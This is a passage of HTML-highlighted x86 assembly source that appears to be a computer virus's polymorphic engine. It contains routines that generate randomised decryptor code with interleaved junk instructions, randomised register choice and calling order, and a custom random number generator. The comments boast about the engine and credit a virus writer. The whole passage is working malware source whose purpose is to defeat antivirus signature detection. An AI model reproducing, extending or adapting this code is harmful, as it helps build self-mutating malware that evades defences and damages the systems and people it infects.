       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flags</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sahf</span><span class="sc0">                                    </span><span class="sc1">;look this!</span><span class="sc0">
   </span><span class="sc5">opcode2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;the decriptor depends</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">            </span><span class="sc1">;of the garbage code!</span><span class="sc0">
       </span><span class="sc6">lahf</span><span class="sc0">                                    </span><span class="sc1">;we keep track of all, regs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">;and flags!!!! :)</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mrval</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011b</span><span class="sc0">                           </span><span class="sc1">;ask a value... we make it</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;(in the requested reg) using</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@g1</span><span class="sc0">                                  </span><span class="sc1">;math and the current garbage</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;status! no more fixed movs :)</span><span class="sc0">
 </span><span class="sc5">@g1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">fxtbl</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;(as you noticed, i'm very</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;proud of this engine)</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@g2</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">@g2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@g3</span><span class="sc0">
 </span><span class="sc5">@g3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">opcode3</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;xor/add/sub</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;congruential something... :)</span><span class="sc0">
   </span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41c64e6dh</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3039h</span><span class="sc0">                          </span><span class="sc1">;thankz to GriYo...</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;(do you not imagine how hard</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is code a decent rnd routine)</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rndf</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;random z flag</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pDOSBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maq</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strloop</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cntregv</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cntreg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pntregv</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pntreg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encintr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">optbl</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0b889h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e829h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d011h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d819h</span><span class="sc0">
       </span><span class="sc1">;  MOV     XOR     ADD     SUB     ADC     SBB</span><span class="sc0">
</span><span class="sc5">fxtbl</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">033f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02bc0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003e8h</span><span class="sc0">
       </span><span class="sc1">;  XOR     ADD     SUB</span><span class="sc0">
</span><span class="sc5">crtbl</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">03b7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05b6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06b4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07b5h</span><span class="sc0">

</span><span class="sc5">flags</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rgusg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">rgtbl</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
   </span><span class="sc5">_ax</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_cx</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_dx</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_bx</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_bp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_si</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_di</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">PolyDOSSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">gldr</span><span class="sc0">


</span><span class="sc5">peng</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;our 32bit poly engine</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">totsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">crptbl</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
  </span><span class="sc5">tlp</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">tlp</span><span class="sc0">                              </span><span class="sc1">;make linear table of values</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">crptbl</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111b</span><span class="sc0">
  </span><span class="sc5">tlp2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd255</span><span class="sc0">                           </span><span class="sc1">;randomize table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd255</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;keep exchanging some bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">tlp2</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">                </span><span class="sc1">;set esp as used</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00110000b</span><span class="sc0">                </span><span class="sc1">;set esp/ebp as used</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get8reg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get32_16reg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tpointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get32_16reg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dpointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get32_16reg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get32_16reg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;choose regs</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">mdecr</span><span class="sc0">                   </span><span class="sc1">;return adress</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">mcounter</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">mpointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">mdpointer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">mixer1</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">m11</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc5">m11</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">m12</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc5">m12</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">m13</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
  </span><span class="sc5">m13</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">mixer1</span><span class="sc0">                           </span><span class="sc1">;randomize calling order</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">mdecr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstart</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011011000001111b</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                                 </span><span class="sc1">;movzx d tmp2, [reg1+reg2]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100b</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10001010b</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                                 </span><span class="sc1">;mov b tmp, [reg1+tmp2]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100b</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10001000b</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                                 </span><span class="sc1">;mov b [reg1+reg2], tmp</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">mcontinue</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">inc_pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">dec_counter</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">m2</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;randomize order</span><span class="sc0">
  </span><span class="sc5">m2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">mcontinue</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                                 </span><span class="sc1">;or reg, reg</span><span class="sc0">
